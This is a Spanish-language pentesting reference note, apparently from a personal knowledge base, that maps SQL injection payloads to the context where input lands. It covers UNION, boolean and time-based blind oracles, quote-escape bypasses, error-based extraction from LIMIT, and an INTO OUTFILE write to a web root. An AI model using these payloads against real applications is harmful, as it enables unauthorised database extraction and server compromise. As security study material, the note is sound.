---
tipo: meta
visibilidad: publica
creado: 2026-08-06
aliases:
  - Payloads contexto
  - SQLi breakout
tags:
  - meta/referencia
  - dominio/web
---

# SQLi contextos - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Dónde cae el input** decide cómo romper para inyectar — es ortogonal al canal. Esta matriz resuelve *"el payload está bien pero no funciona"*: casi siempre es que estás en un contexto que no acepta esa sintaxis. `yi``  ` copia el payload.

## Identificar el contexto

`'` da error pero `1` no  → estás en **string** (hay comilla que cerrar).
`1` da error o cambia todo  → estás en **numérico** (sin comillas).
El parámetro es un `sort`, `order`, `dir`  → probable **`ORDER BY`**.
El parámetro es `page`, `limit`, `offset`  → probable **`LIMIT`**.
El input se guarda y no vuelve  → sospechar [[SQLi - inyección de segundo orden]].

## Numérico

```sql
... WHERE id = ENTRADA
```

`1 AND 1=1`  vs  `1 AND 1=2`
Confirmación: sin comillas, se inyecta directo.

`1 UNION SELECT 1,2,3-- -`
El UNION va pegado, sin cerrar nada.

`0 UNION SELECT ...`  /  `-1 UNION SELECT ...`
Un id que no existe suprime la fila original, quedan solo las tuyas.

## String

```sql
... WHERE name = 'ENTRADA'
```

`juan' AND '1'='1`  vs  `juan' AND '1'='2`
Confirmación: hay que cerrar la comilla y re-balancear.

`juan' UNION SELECT 1,2,3-- -`
Con `-- -` no hace falta re-balancear: se comenta la comilla de cierre original.

`juan\'` o `juan%bf%27` (GBK)
Si escapan la comilla, probar bypass de escape con backslash o multibyte.

## `ORDER BY`

```sql
... ORDER BY ENTRADA
```

Acá **no** entra `AND`, `UNION` ni `WHERE`: `ORDER BY` espera una columna o expresión.

`1`  vs  `9999`
Si `9999` da *Unknown column*, hay inyección y sabés que ordena por número de columna.

`(CASE WHEN (1=1) THEN name ELSE id END)`
Oráculo booleano: cambia el orden del resultado según la condición. Así se extrae a ciegas.

`(SELECT 1 FROM (SELECT SLEEP(3))x)`
Oráculo temporal desde `ORDER BY`.

`1,(SELECT ...)`  — solo si acepta múltiples columnas
A veces se puede anexar una subconsulta separada por coma.

> [!warning] No se puede parametrizar
> `ORDER BY` es de los pocos lugares donde el nombre de columna no puede ir como parámetro ligado, así que muchas apps lo concatenan — por eso es un punto de inyección tan común.

## `LIMIT`

```sql
... LIMIT ENTRADA
```

`1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)`
MySQL < 5.6: extrae por error desde `LIMIT`.

`1 INTO OUTFILE '/var/www/html/x.txt'`
Si hay privilegio de escritura, se puede encadenar desde acá.

En MySQL moderno, tras `LIMIT` casi solo sirve subconsulta temporal o `PROCEDURE` en versiones viejas. Si no, se busca otro parámetro.

## `INSERT` / `UPDATE`

```sql
INSERT INTO log (ip, ua) VALUES ('ENTRADA', '...')
```

`x', (SELECT version()))-- -`
Cerrar el valor, agregar la subconsulta en el siguiente campo del `VALUES`.

`x' + (SELECT ...) + '`  (MSSQL)  /  `x'||(SELECT ...)||'`  (Oracle/PgSQL)
Concatenar la subconsulta dentro del mismo campo string.

El resultado casi nunca vuelve en la respuesta —un `INSERT` no imprime filas—, así que este contexto tiende a resolverse por error-based, ciego, o [[SQLi - inyección de segundo orden]].

## Relacionadas

[[MOC - SQL injection]] · [[SQLi UNION - matriz de referencia]] · [[Dialectos SQL - matriz de referencia]]
